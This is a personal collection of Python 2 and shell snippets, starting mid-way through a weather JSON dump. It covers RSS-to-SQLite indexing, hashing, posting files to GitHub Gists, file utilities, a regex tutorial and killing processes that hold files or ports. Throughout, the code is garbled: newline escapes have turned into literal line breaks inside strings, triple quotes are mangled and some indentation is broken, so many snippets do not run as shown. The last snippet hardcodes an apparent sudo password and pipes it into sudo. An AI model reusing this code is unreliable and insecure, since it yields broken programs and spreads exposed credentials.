15:00","temp_c":9.4,"temp_f":48.9,"is_day":1,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/day/119.png","code":1006},"wind_mph":2.7,"wind_kph":4.3,"wind_degree":238,"wind_dir":"WSW","pressure_mb":1020.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":55,"cloud":74,"feelslike_c":9.1,"feelslike_f":48.4,"windchill_c":9.1,"windchill_f":48.4,"heatindex_c":9.4,"heatindex_f":48.9,"dewpoint_c":0.8,"dewpoint_f":33.4,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.4,"vis_miles":12.0},{"time_epoch":1510153200,"time":"2017-11-08 16:00","temp_c":9.7,"temp_f":49.5,"is_day":1,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/day/119.png","code":1006},"wind_mph":3.6,"wind_kph":5.8,"wind_degree":334,"wind_dir":"NNW","pressure_mb":1020.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":55,"cloud":74,"feelslike_c":9.2,"feelslike_f":48.6,"windchill_c":9.2,"windchill_f":48.6,"heatindex_c":9.7,"heatindex_f":49.5,"dewpoint_c":1.0,"dewpoint_f":33.8,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.9,"vis_miles":12.0},{"time_epoch":1510156800,"time":"2017-11-08 17:00","temp_c":9.3,"temp_f":48.7,"is_day":1,"condition":{"text":"Overcast","icon":"//cdn.apixu.com/weather/64x64/day/122.png","code":1009},"wind_mph":3.4,"wind_kph":5.4,"wind_degree":333,"wind_dir":"NNW","pressure_mb":1021.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":59,"cloud":83,"feelslike_c":8.9,"feelslike_f":48.0,"windchill_c":8.9,"windchill_f":48.0,"heatindex_c":9.3,"heatindex_f":48.7,"dewpoint_c":1.5,"dewpoint_f":34.7,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.6,"vis_miles":12.0},{"time_epoch":1510160400,"time":"2017-11-08 18:00","temp_c":8.8,"temp_f":47.8,"is_day":0,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/night/119.png","code":1006},"wind_mph":2.9,"wind_kph":4.7,"wind_degree":333,"wind_dir":"NNW","pressure_mb":1021.0,"pressure_in":30.6,"precip_mm":0.0,"precip_in":0.0,"humidity":63,"cloud":91,"feelslike_c":8.5,"feelslike_f":47.3,"windchill_c":8.5,"windchill_f":47.3,"heatindex_c":8.8,"heatindex_f":47.8,"dewpoint_c":2.1,"dewpoint_f":35.8,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.3,"vis_miles":11.0},{"time_epoch":1510164000,"time":"2017-11-08 19:00","temp_c":8.4,"temp_f":47.1,"is_day":0,"condition":{"text":"Overcast","icon":"//cdn.apixu.com/weather/64x64/night/122.png","code":1009},"wind_mph":2.7,"wind_kph":4.3,"wind_degree":332,"wind_dir":"NNW","pressure_mb":1022.0,"pressure_in":30.7,"precip_mm":0.0,"precip_in":0.0,"humidity":67,"cloud":100,"feelslike_c":8.2,"feelslike_f":46.8,"windchill_c":8.2,"windchill_f":46.8,"heatindex_c":8.4,"heatindex_f":47.1,"dewpoint_c":2.6,"dewpoint_f":36.7,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":19.0,"vis_miles":11.0},{"time_epoch":1510167600,"time":"2017-11-08 20:00","temp_c":8.3,"temp_f":46.9,"is_day":0,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/night/119.png","code":1006},"wind_mph":2.7,"wind_kph":4.3,"wind_degree":335,"wind_dir":"NNW","pressure_mb":1022.0,"pressure_in":30.7,"precip_mm":0.0,"precip_in":0.0,"humidity":69,"cloud":92,"feelslike_c":8.1,"feelslike_f":46.6,"windchill_c":8.1,"windchill_f":46.6,"heatindex_c":8.3,"heatindex_f":46.9,"dewpoint_c":2.9,"dewpoint_f":37.2,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.6,"vis_miles":11.0},{"time_epoch":1510171200,"time":"2017-11-08 21:00","temp_c":8.2,"temp_f":46.8,"is_day":0,"condition":{"text":"Overcast","icon":"//cdn.apixu.com/weather/64x64/night/122.png","code":1009},"wind_mph":2.7,"wind_kph":4.3,"wind_degree":337,"wind_dir":"NNW","pressure_mb":1022.0,"pressure_in":30.7,"precip_mm":0.0,"precip_in":0.0,"humidity":71,"cloud":83,"feelslike_c":7.9,"feelslike_f":46.2,"windchill_c":7.9,"windchill_f":46.2,"heatindex_c":8.2,"heatindex_f":46.8,"dewpoint_c":3.2,"dewpoint_f":37.8,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":18.3,"vis_miles":11.0},{"time_epoch":1510174800,"time":"2017-11-08 22:00","temp_c":8.1,"temp_f":46.6,"is_day":0,"condition":{"text":"Cloudy","icon":"//cdn.apixu.com/weather/64x64/night/119.png","code":1006},"wind_mph":2.7,"wind_kph":4.3,"wind_degree":340,"wind_dir":"NNW","pressure_mb":1023.0,"pressure_in":30.7,"precip_mm":0.0,"precip_in":0.0,"humidity":73,"cloud":75,"feelslike_c":7.8,"feelslike_f":46.0,"windchill_c":7.8,"windchill_f":46.0,"heatindex_c":8.1,"heatindex_f":46.6,"dewpoint_c":3.5,"dewpoint_f":38.3,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":17.9,"vis_miles":11.0},{"time_epoch":1510178400,"time":"2017-11-08 23:00","temp_c":8.0,"temp_f":46.4,"is_day":0,"condition":{"text":"Overcast","icon":"//cdn.apixu.com/weather/64x64/night/122.png","code":1009},"wind_mph":2.7,"wind_kph":4.3,"wind_degree":229,"wind_dir":"SW","pressure_mb":1023.0,"pressure_in":30.7,"precip_mm":0.0,"precip_in":0.0,"humidity":72,"cloud":81,"feelslike_c":7.7,"feelslike_f":45.9,"windchill_c":7.7,"windchill_f":45.9,"heatindex_c":8.0,"heatindex_f":46.4,"dewpoint_c":3.3,"dewpoint_f":37.9,"will_it_rain":0,"chance_of_rain":"0","will_it_snow":0,"chance_of_snow":"0","vis_km":17.9,"vis_miles":11.0}]}]}} 

json = open("weather.json","r").read()
json = json.replace(":", "
")
print json


----
id:82

import sqlite3
import feedparser
import time
import sqlite3
Dbase = 'bigfeedfts.db'
conn = sqlite3.connect(Dbase)
c = conn.cursor()
#c.execute('''
#CREATE TABLE IF NOT EXISTS bbctech
#(head text, feed text)
#''');
c.execute(""
CREATE VIRTUAL TABLE IF NOT EXISTS bbctech 
USING FTS3(head, feed);
"")
count=0
while count<35:
    count=count+1
    if count==1:feed='http://feeds.bbci.co.uk/news/technology/rss.xml'
    if count==2:feed='http://www.cbn.com/cbnnews/us/feed/'
    if count==3:feed='http://feeds.reuters.com/Reuters/worldNews'
    if count==4:feed='http://feeds.bbci.co.uk/news/technology/rss.xml'
    if count==5:feed='http://news.sky.com/info/rss'
    if count==6:feed='http://www.cbn.com/cbnnews/us/feed/'
    if count==7:feed='http://feeds.reuters.com/Reuters/domesticNews'
    if count==8:feed='http://news.yahoo.com/rss/'
    if count==9:feed='http://www.techradar.com/rss'
    if count==10:feed='https://www.wired.com/feed/rss'
    if count==11:feed='http://www.zdnet.com/zdnet.opml'
    if count==12:feed='http://www.computerweekly.com/rss/All-Computer-Weekly-content.xml'
    if count==13:feed='http://gadgets.ndtv.com/rss/feeds'
    if count==14:feed='http://feeds.arstechnica.com/arstechnica/index'        
    if count==15:feed='https://www.techworld.com/news/rss'
    if count==16:feed='https://www.infoworld.com/index.rss'        
    if count==18:feed='https://www.pcworld.com/index.rss'   
    if count==19:feed='http://tech.economictimes.indiatimes.com/rss/technology'
    if count==20:feed='https://www.technologyreview.com/stories.rss'        
    if count==21:feed='http://tech.economictimes.indiatimes.com/rss/topstories'
    if count==22:feed='http://feeds.feedburner.com/digit/latest-from-digit'
    if count==23:feed='http://feeds.techsoup.org/TechSoup_Articles'
    if count==24:feed='http://rss.sciam.com/ScientificAmerican-News?format=xml'
    if count==25:feed='https://www.sciencedaily.com/rss/all.xml'    
    if count==26:feed='http://feeds.nanowerk.com/nanowerk/agWB'
    if count==27:feed='http://feeds.nanowerk.com/NanowerkNanotechnologySpotlight'
    if count==28:feed='http://feeds.nanowerk.com/feedburner/NanowerkRoboticsNews'
    if count==29:feed='http://feeds.nanowerk.com/NanowerkSpaceExplorationNews'
    if count==30:feed='http://www.npr.org/rss/rss.php?id=1019'
    if count==31:feed='http://feeds.nature.com/news/rss/news_s16?format=xml'
    if count==32:feed='http://feeds.latimes.com/latimes/technology?format=xml'
    if count==33:feed='http://feeds.feedburner.com/BadAstronomyBlog?format=xml'
    if count==34:feed='http://feeds.newscientist.com/physics-math'
    if count==35:feed='http://rss.slashdot.org/Slashdot/slashdotMain'
    d = feedparser.parse(feed)
    for post in d.entries:
        aa = `d['feed']['title'],d['feed']['link'],d.entries[0]['link']`
        bb = `post.title + ": " + post.link + ""`
        conn = sqlite3.connect(Dbase)
        c = conn.cursor()
        c.execute("INSERT INTO bbctech VALUES (?,?)", (aa,bb))
        conn.commit()
        conn.close()
        
        
conn = sqlite3.connect(Dbase)
c = conn.cursor()# Never
count=0
for row in c.execute('SELECT * FROM bbctech ORDER BY rowid DESC'):
    row=str(row)
    row=row.replace("(u","");row=row.replace('", u"u',"
")
    row=row.replace("/', u'","   ");row=row.replace('"',"")
    row=row.replace("', u'","  ");row=row.replace("')","  ")
    row=row.replace("'","");row=row.replace("  , uu","
")
    count=count+1
    print"
Number :",count," -----
",(row)

----
id:83

%%writefile HashCheck.py
"" USEAGE:
(insert hash)

for example to get hash of a filename:
def md5(Path):
    hash_md5 = hashlib.md5()
    with open(Path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

Hash = md5(title)

import HashCheck
hasht = "jsudsfhndsfjunjsd"
HashCheck.hashfill(Hash)
---------------
import HashCheck
HashCheck.hashcheck()

import HashCheck
HashCheck.killmem()
""
import sqlite3
import sys
import os

def md5(Path):
    hash_md5 = hashlib.md5()
    with open(Path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def hashfill(Hash):
    import sqlite3
    database ="tmp-mem"
    conn = sqlite3.connect(database)
    c = conn.cursor()  
    c.execute("CREATE TABLE IF NOT EXISTS Hash(hasht TEXT);")
    c.execute("INSERT INTO Hash(hasht) VALUES(?)",(Hash,))
    conn.commit()
    conn.close()
    
def hashcheck():
    import sqlite3
    database ="tmp-mem"
    conn = sqlite3.connect(database)
    c = conn.cursor()  
    rows = c.execute("SELECT rowid, hasht FROM Hash")
    for row in rows:
        print row[1]
    return
   
def killmem():
    os.remove(database)
    print(database,"Removed!")

----
id:84

#%%writefile GISTstore/post2gist.py
import os
from time import sleep
import sqlite3
import os, requests, sys, json
import GISTkey
username=GISTkey.gistkey()[0]
password=GISTkey.gistkey()[1]
database ="GISTstore/gist.db"
conn = sqlite3.connect(database)
c = conn.cursor()
c.execute(""
CREATE VIRTUAL TABLE IF NOT EXISTS gist 
USING FTS4(content, description, filename);
"")
c.close()
conn.close()
conn = sqlite3.connect(database)
conn.text_factory=str 
c = conn.cursor()
if not os.path.exists('GISTstore'):
    os.makedirs('GISTstore')    
#PATH = "GISTstore/"
#filename = "UnCamel.py"
#content=open(PATH+filename, 'r').read()
filename = "Post_To_Gist _PostToGist.py.ipynb"
content=open(filename, 'r').read()
post = 'https://api.github.com/gists'
r = requests.post(post,json.dumps({'files':{filename:{"content":content}}}),
                  auth=requests.auth.HTTPBasicAuth(username, password)) 
sleep(2)
Url= (r.json()['html_url'])
c.execute("INSERT INTO gist VALUES (?,?,?)", (content, Url, filename)) 
conn.commit()
title = "Index"
c.execute("INSERT INTO gist VALUES (?,?,?)", (title, Url, filename)) 
conn.commit()
for row in c.execute('SELECT rowid, content, description, filename FROM gist     WHERE filename MATCH ?', (filename,)):
        print Url,"
",row[0],row[1],row[2],row[3]
c.close()
conn.close()

----
id:85

%%writefile GistIndex.py
#Useage: python GistIndex.py
import sqlite3
def Index():
    database ="GISTstore/gist.db"
    conn = sqlite3.connect(database)
    c = conn.cursor()
    for row in c.execute('SELECT rowid, content, description, filename FROM gist         WHERE content = ?', ("Index",)):
            print row[0],row[1],row[2],row[3]
            

if __name__ == "__main__":
    Index() 

----
id:86

simple gist post no database

%%writefile GISTstore/SimpleGistPost.py
#!/usr/bin/python
#USE: python SimpleGistPost.py FileToPost.py
import os, requests, sys, json
import GISTkey
from time import sleep
username=GISTkey.gistkey()[0]
password=GISTkey.gistkey()[1]
filename = os.path.basename(sys.argv[1])
content=open(filename, 'r').read()
r = requests.post('https://api.github.com/gists',json.dumps({'files':{filename:{"content":content}}}),auth=requests.auth.HTTPBasicAuth(username, password)) 
sleep(2)
print(r.json()['html_url'])

----
id:87

import os.path
from os import listdir, getcwd
def mp3list(PATH):
    abs_path = os.path.join(os.getcwd(),PATH)
    dir_files = os.listdir(abs_path)
    return dir_files

def mkFile(mfile, PATH):
    mFiles = open(mfile, "w");mFiles.close()
    lst = mp3list(PATH)
    lst = str(lst)
    lst = lst.replace(",","
");lst = lst.replace("'","")
    lst = lst.replace("[","");lst = lst.replace("]","")
    lst = lst.replace(" ","")
    print lst
    mFiles = open(mfile, "a")
    mFiles.write(lst)
    mFiles.close()
    
PATH = "MP3/"
mfile = "GISTstore/muz.list"
mkFile(mfile, PATH)
---
list directory, list to file directory, list to file

----
id:88

def filelen(fname):
    with open(fname) as f:
        for i, l in enumerate(f):
            pass
    return i + 1
get file len file length characters in file         

----
id:89

#find table names, unknown sqlite database
import sqlite3
import sys
from time import sleep
parts = []
database = "/home/jack/Desktop/text_stuff/database-bak/collection.db"
conn = sqlite3.connect(database)
conn.text_factory = str
c = conn.cursor()
res = c.execute("SELECT name FROM sqlite_master WHERE type='table';")
for name in res:
    sleep(2)
    
    print name[0] 
    
#explore a database unknown database find lost table tables sqlite_master sqlite tricks    

#recover column names recover field names, unknown database, unknown sqlite
import sqlite3
database = "/home/jack/Desktop/text_stuff/database-bak/collection.db"
conn = sqlite3.connect(database)
c = conn.cursor()
cur = c.execute('select * from tweets')

#this also works
#names = list(map(lambda x: x[0], cur.description))

names = [description[0] for description in cur.description]
print names[0:]

----
id:90

import sqlite3
from time import sleep 
import sys
conn = sqlite3.connect('/home/jack/snippet.db')
conn.text_factory = str
c = conn.cursor()
count=0;req=200
filein = open("allsnippets.txt","w");filein.close()
filein = open("allsnippets.txt","a")
for row in c.execute('SELECT rowid, * FROM snippet'):    

    info= (row)[2]
    info = str(info)
    info = info+"

"
    filein.write(info)
    
    
filein.close()    

----
id:91

# Remove blank ( white spaces ) from filenames recursive recursively remove white spaces 
import os
from shutil import copyfile
for dirpath, dirnames, filenames in os.walk("/home/jack/"):
    for filename in [f for f in filenames if f.endswith(".ipynb")]:
        Path = os.path.join(dirpath, filename)
        os.rename(os.path.join(dirpath, filename), os.path.join(dirpath, filename.replace(' ', '-')))
    

----
id:92

# Remove blank ( white spaces ) from filenames recursive recursively remove white spaces 
import os
from shutil import copyfile
for dirpath, dirnames, filenames in os.walk("/home/jack/"):
    #The next two lines skip hidden folders and files
    filenames = [f for f in filenames if not f[0] == '.']
    dirnames[:] = [d for d in dirnames if not d[0] == '.']
    for filename in [f for f in filenames if f.endswith(".ipynb")]:
        Path = os.path.join(dirpath, filename)
        os.rename(os.path.join(dirpath, filename), os.path.join(dirpath, filename.replace(' ', '-')))
    
---------------------------------
for root, dirs, files in os.walk(path):
    files = [f for f in files if not f[0] == '.']
    dirs[:] = [d for d in dirs if not d[0] == '.']

----
id:93

# Return only the numbers in a string
def only_numerics(seq):
    return filter(type(seq).isdigit, seq)

def only_numerics(seq):
    seq_type= type(seq)
    return seq_type().join(filter(seq_type.isdigit, seq))

seq = "sjdhdyfjd343555ksishdkdsioj7skdkjshsgjs"
#only_numerics(seq)
only_numerics(seq)

----
id:94

Using the RE re module regedit 
Metacharacter(s) 	Description 	Example
Note that all the if statements return a TRUE value
. 	Normally matches any character except a newline. Within square brackets the dot is literal. 	


string1 = "Hello, world."
if re.search(r".....", string1):
    print string1 + " has length >= 5"

( ) 	Groups a series of pattern elements to a single element. When you match a pattern within parentheses, you can use any of $1, $2, ... later to refer to the previously matched pattern. 	

string1 = "Hello, world."
m_obj = re.search(r"(H..).(o..)", string1)
if m_obj:
    print "We matched '" + m_obj.group(1) +          "' and '" + m_obj.group(2) + "'"

Output:    We matched 'Hel' and 'o, ';


+ 	Matches the preceding pattern element one or more times. 	

string1 = "Hello, world."
if re.search(r"l+", string1):
    print 'There are one or more consecutive letter "l"' +          "'s in " + string1

Output: There are one or more consecutive letter "l"'s in Hello World

? 	Matches the preceding pattern element zero or one times. 	

string1 = "Hello, world."
if re.search(r"H.?e", string1):
    print "There is an 'H' and a 'e' separated by " +          "0-1 characters (Ex: He Hoe)
"

? 	Modifies the *, +, or {M,N}'d regexp that comes before to match as few times as possible. 	


string1 = "Hello, world."
if re.search(r"l.+?o", string1):
    print "The non-greedy match with 'l' followed by
" +          "one or more characters is 'llo' rather than
" +          "'llo wo'."

* 	Matches the preceding pattern element zero or more times. 	

string1 = "Hello, world."
if re.search(r"el*o", string1):
    print "There is an 'e' followed by zero to many
" +          "'l' followed by 'o' (eo, elo, ello, elllo)"

{M,N} 	Denotes the minimum M and the maximum N match count. 	

string1 = "Hello, world."
if re.search(r"l{1,2}", string1):
    print "There exists a substring with at least 1
" +          "and at most 2 l's in " + string1

[...] 	Denotes a set of possible character matches. 	

string1 = "Hello, world."
if re.search(r"[aeiou]+", string1):
    print string1 + " contains one or more vowels."

| 	Separates alternate possibilities. 	

string1 = "Hello, world."
if re.search(r"(Hello|Hi|Pogo)", string1):
    print "At least one of Hello, Hi, or Pogo is " +          "contained in " + string1

 	Matches a word boundary. 	

string1 = "Hello World"
if re.search(r"llo", string1):
    print "There is a word that ends with 'llo'"
else:
    print "There are no words that end with 'llo'"

\w 	Matches an alphanumeric character, including "_". 	

string1 = "Hello World"
m_obj = re.search(r"(\w\w)", string1)
if m_obj:
    print "The first two adjacent alphanumeric characters"
    print "(A-Z, a-z, 0-9, _) in", string1, "were",
    print m_obj.group(1)

Output: The first two adjacent alphanumeric characters
        (A-Z, a-z, 0-9, _) in Hello World were He

\W 	Matches a non-alphanumeric character, excluding "_". 	

string1 = "Hello World"
if re.search(r"\W", string1):
    print "The space between Hello and " +          "World is not alphanumeric"

\s 	Matches a whitespace character (space, tab, newline, form feed) 	

string1 = "Hello World
"
if re.search(r"\s.*\s", string1):
    print "There are TWO whitespace characters, which may"
    print "be separated by other characters, in", string1

\S 	Matches anything BUT a whitespace. 	

string1 = "Hello World
"
m_obj = re.search(r"(\S*)\s*(\S*)", string1)
if m_obj:
    print "The first two groups of NON-whitespace characters"
    print "are '%s' and '%s'." % m_obj.groups()

Output:   The first two groups of NON-whitespace characters
          are 'Hello' and 'World'.

\d 	Matches a digit, same as [0-9]. 	

string1 = "99 bottles of beer on the wall."
m_obj = re.search(r"(\d+)", string1)
if m_obj:
    print m_obj.group(1), "is the first number in '" +                          string1 + "'"

Output:   99 is the first number in '99 bottles of beer on the wall.'

\D 	Matches a non-digit. 	

string1 = "Hello World"
if re.search(r"\D", string1):
    print "There is at least one character in", string1,
    print "that is not a digit."

^ 	Matches the beginning of a line or string. 	

string1 = "Hello World"
if re.search(r"^He", string1):
    print string1, "starts with the characters 'He'"

$ 	Matches the end of a line or string. 	

string1 = "Hello World"
if re.search(r"rld$", string1):
    print string1, "is a line or string " +          "that ends with 'rld'"

\A 	Matches the beginning of a string (but not an internal line). 	

string1 = "Hello
World
"
if re.search(r"\AH", string1):
    print string1, "is a string",
    print "that starts with 'H'"

Output:  Hello
         World
         is a string that starts with 'H'

\Z 	Matches the end of a string (but not an internal line). 	

string1 = "Hello
World
"
if re.search(r"d
\Z", string1):
    print string1, "is a string",
    print "that ends with 'd
'"

[^...] 	Matches every character except the ones inside brackets. 	

string1 = "Hello World
"
if re.search(r"[^abc]", string1):
    print string1 + " contains a character other than " +          "a, b, and c"

----
id:95

# Print the first word of a random line from a file
import random
def generate_the_word(infile):
        with open(infile) as f:
            contents_of_file = f.read()
        lines = contents_of_file.splitlines()
        line_number = random.randrange(0, len(lines))
        return lines[line_number]
    
infile = "/home/jack/Desktop/text_stuff/ALL_WIKI_GOOD.txt"    
line = generate_the_word(infile) 
print line.split(' ', 1)[0] 

----
id:96

num = raw_input ("Type Number : ")
search = open("file.txt")
for line in search:
 if num in line:
  print line 
  
---------------
search text, locate text, line number, print by line number
search strings, locate strings, line numbers, print by line string
find text in file, search a file

----
id:97

with open('largeFile', 'r') as inF:
    for line in inF:
        if 'myString' in line:
            # do_something
---------------
search text, locate text, line number, print by line number
search strings, locate strings, line numbers, print by line string
find text in file, search a file

----
id:98

import re
def check_string():
    #no need to pass arguments to function if you're not using them
    w = raw_input("Input the English word: ")

    #open the file using `with` context manager, it'll automatically close the file for you
    with open("example.txt") as f:
        found = False
        for line in f:  #iterate over the file one line at a time(memory efficient)
            if re.search("{0}".format(w),line):    #if string found is in current line then print it
                print line
                found = True
        if not found:
            print('The translation cannot be found!')

check_string() #now call the function
---------------
search function, search with function,
search text, locate text, line number, print by line number
search strings, locate strings, line numbers, print by line string
find text in file, search a file

----
id:99

The idiomatic way to do this in Python is to use rstrip('
'):

for line in open('myfile.txt'):  # opened in text-mode; all EOLs are converted to '
'
    line = line.rstrip('
')
    process(line)
----------------   
rstrip('
') , rstrip(), rmove 
 , strip 
 , delete 
    

----
id:100

#remove characters fron front or rear of a line 
STR ="'The idiomatic way to do this in Python is to use rstrip('
'):'"

STR = STR.strip("'")
#Result: The idiomatic way to do this in Python is to use rstrip('
#        '):

STR = STR.rstrip("('
'):")
#Result: The idiomatic way to do this in Python is to use rstrip

STR = STR.lstrip("The")
# result:
# idiomatic way to do this in Python is to use rstrip

print STR
----------------   
rstrip('
') , rstrip(), rmove 
 , strip 
 , delete 
    

----
id:101

STR = "Citizen of the Year\u2019 \u2014 \u2018Richly Deserved\u2019."
wordList = re.sub("[^\w]", " ",  STR).split()
has_string=False
Find = "u"
count=0
for item in wordList:
    count=count+1
    if Find in item:
        has_string=True
        
        print count,"***Has string ",Find," TRUE*****"

print " ".join(wordList),

------------------
create list from str string list from string find string in list search list \

----
id:102

from time import sleep
# Method to check a given sentence for given rules
def checkSentence(string):
    # Calculate the length of the string.
    length = len(string)
 
    # Check that the first character lies in [A-Z].
    # Otherwise return false.
    if string[0] < 'A' or string[0] > 'Z':
        return False
 
    # If the last character is not a full stop(.) no
    # need to check further.
    if string[length-1] != '.':
        return False
 
    # Maintain 2 states. Previous and current state based
    # on which vertex state you are. Initialise both with
    # 0 = start state.
    prev_state = 0
    curr_state = 0
 
    # Keep the index to the next character in the string.
    index = 1
 
    # Loop to go over the string.
    while (string[index]):
        # Set states according to the input characters in the
        # string and the rule defined in the description.
        # If current character is [A-Z]. Set current state as 0.
        if string[index] >= 'A' and string[index] <= 'Z':
            curr_state = 0
 
        # If current character is a space. Set current state as 1.
        elif string[index] == ' ':
            curr_state = 1
 
        # If current character is a space. Set current state as 2.
        elif string[index] >= 'a' and string[index] <= 'z':
            curr_state = 2
 
        # If current character is a space. Set current state as 3.
        elif string[index] == '.':
            curr_state = 3
 
        # Validates all current state with previous state for the
        # rules in the description of the problem.
        if prev_state == curr_state and curr_state != 2:
            return False
 
        # If we have reached last state and previous state is not 1,
        # then check next character. If next character is ' ', then
        # return true, else false
        if prev_state == 2 and curr_state == 0:
            return False
 
        # Set previous state as current state before going over
        # to the next character.
        if curr_state == 3 and prev_state != 1:
            return True
 
        index += 1
 
        prev_state = curr_state
 
    return False
def sent(line):
    if line[0] < 'A' or line[0] > 'Z':
        return False
    
def addperiod(line):
    line = [ (str.rstrip('
') + "." + "
" ) for str in line ]
    return line

def period(line):
    line = [ (str.rstrip('
') + "." + "
" ) for str in line ]
    return line
def sent(line):
    if line[0] < 'A' or line[0] > 'Z':
        return False

infile = open("Alltext_good_no_dup.txt")
lines = infile.readlines()
for line in lines:
    line = line.split(".")
    line = period(line)
    sleep(1)
    sentence = line[0]
    sentence = sentence.rstrip("
").capitalize()
     if not sentence[0].isupper() and sentence[-1] != '.': # You can check the last character using sentence[-1]
        # both the conditions are not satisfied
        print 'Your sentence does not start with a capital letter and has no full stop at the end.'
    elif not sentence[0].isupper():
        # sentence does not start with a capital letter
        print 'Your sentence does not start with a capital letter.'
    elif sentence[-1] != '.':
        # sentence does not end with a full stop
        print 'Your sentence does not end with a full stop.'
    else:
        # sentence is perfect
        print 'Your sentence is perfect.'        
        
        #if "//tw" in sentence:pass
        if "//tw" != sentence and len(sentence)> 40:  
            print sentence  
        else: print len(sentence),"SKIPPED   SKIPPED   SKIPPED   SKIPPED   SKIPPED   SKIPPED   "   
sentence is good verify sentence perfect sentence good sentence

----
id:103

from enchant.checker import SpellChecker
def evaluate(line):
    chkr = SpellChecker("en_US")
    value = True
    chkr.set_text(line)
    for err in chkr:
        #print "ERROR:", err.word
        if err.word > "":value=False;break
    #print value        
    return value    
        
STR = "You have a sequence of items, and you'd like to determine the most frequently occurring."     
evaluate(STR)

-------------
enchant.checker import Spell Checker
enchant spell checker import SpellChecker

----
id:104

jack@jack-desktop:~/Desktop/Processing/Processing$ fuser runit.db
/home/jack/Desktop/Processing/Processing/runit.db: 20512
jack@jack-desktop:~/Desktop/Processing/Processing$ kill 20512
jack@jack-desktop:~/Desktop/Processing/Processing$ fuser runit.db
jack@jack-desktop:~/Desktop/Processing/Processing$ fuser runit.db
jack@jack-desktop:~/Desktop/Processing/Processing$ kill 20512
bash: kill: (20512) - No such process
jack@jack-desktop:~/Desktop/Processing/Processing$ fuser nltk.db
/home/jack/Desktop/Processing/Processing/nltk.db: 29997
jack@jack-desktop:~/Desktop/Processing/Processing$ kill 29997
jack@jack-desktop:~/Desktop/Processing/Processing$ 

-------------
unlock a locked database unlock db database is locked how to unlock database

----
id:106

%%writefile UnicodeToAscii.py
def unicodetoascii(text):

    uni2ascii = {
            ord('’'.decode('utf-8')): ord("'"),
            ord('“'.decode('utf-8')): ord('"'),
            ord('”'.decode('utf-8')): ord('"'),
            ord('„'.decode('utf-8')): ord('"'),
            ord('‟'.decode('utf-8')): ord('"'),
            ord('é'.decode('utf-8')): ord('e'),
            ord('“'.decode('utf-8')): ord('"'),
            ord('–'.decode('utf-8')): ord('-'),
            ord('‒'.decode('utf-8')): ord('-'),
            ord('—'.decode('utf-8')): ord('-'),
            ord('—'.decode('utf-8')): ord('-'),
            ord('‘'.decode('utf-8')): ord("'"),
            ord('‛'.decode('utf-8')): ord("'"),

            ord('‐'.decode('utf-8')): ord('-'),
            ord('‑'.decode('utf-8')): ord('-'),

            ord('′'.decode('utf-8')): ord("'"),
            ord('″'.decode('utf-8')): ord("'"),
            ord('‴'.decode('utf-8')): ord("'"),
            ord('‵'.decode('utf-8')): ord("'"),
            ord('‶'.decode('utf-8')): ord("'"),
            ord('‷'.decode('utf-8')): ord("'"),

            ord('⁺'.decode('utf-8')): ord("+"),
            ord('⁻'.decode('utf-8')): ord("-"),
            ord('⁼'.decode('utf-8')): ord("="),
            ord('⁽'.decode('utf-8')): ord("("),
            ord('⁾'.decode('utf-8')): ord(")"),

                            }
    return text.decode('utf-8').translate(uni2ascii).encode('ascii')

#print unicodetoascii("weren’t")  

-------------
text decode utf-8 translate ascii).encode('ascii')

 decode('utf-8').translate uni2ascii encode ascii



----
id:107

import os.path
from os import listdir, getcwd
def mp3list(PATH):
    abs_path = os.path.join(os.getcwd(),PATH)
    dir_files = os.listdir(abs_path)
    return dir_files

def mkFile(mfile, PATH):
    mFiles = open(mfile, "w");mFiles.close()
    lst = mp3list(PATH)
    lst = str(lst)
    lst = lst.replace(",","
");lst = lst.replace("'","")
    lst = lst.replace("[","");lst = lst.replace("]","")
    lst = lst.replace(" ","")
    print lst
    mFiles = open(mfile, "a")
    mFiles.write(lst)
    mFiles.close()
    
PATH = "MP3/"
mfile = "GISTstore/muz.list"
mkFile(mfile, PATH)
---
list directory, list to file directory, list to file

----
id:108

# Find all files with a specific EXT and list in a file
import os
import os.path
title = "MP3/MP3-list.list"
f= open(title,"w")
f.close()
count=0
for dirpath, dirnames, filenames in os.walk("/home/jack/Desktop/Processing/Processing/MP3/"):
    for filename in [f for f in filenames if f.endswith(".mp3")]:
        count=count+1
        Path = os.path.join(dirpath, filename)
        with open(title, 'a') as outfile:
            path = Path+"
"
            outfile.write(path)
-------------------------------
dirpath, dirnames, filenames in os.walk
            

----
id:109

# filter all bad characters from the a string that are not printable.
# Keywords: bad characters encode error unicode error ascii error UnicodeDecodeError Unicode Decode Error
# 'ascii' codec can't decode byte 0xe2 in position 90: ordinal not in range(128)
# Use string.printable, like this:
s = "some string. with funny characters"
import string
printable = set(string.printable)
filter(lambda x: x in printable, s)

----
id:110

jupyter nbconvert --to script 'nltksession2complete.ipynb'
[NbConvertApp] Converting notebook nltksession2complete.ipynb to script
[NbConvertApp] Writing 24144 bytes to nltksession2complete.py


----
id:111

Find the process id that is using the port:
sudo lsof -i :3000
Kill it:
kill -9 <PID>
-------------------
process using port, whats using a port open a port, kill process on port, 
what on port using port what is using port what process


----
id:112

# works 
import os
command = 'rm /usr/local/lib/python2.7/dist-packages/skpy/event.pyc'
os.popen("sudo -S %s"%(command), 'w').write('ThinkPadT$#')

# works
import getpass
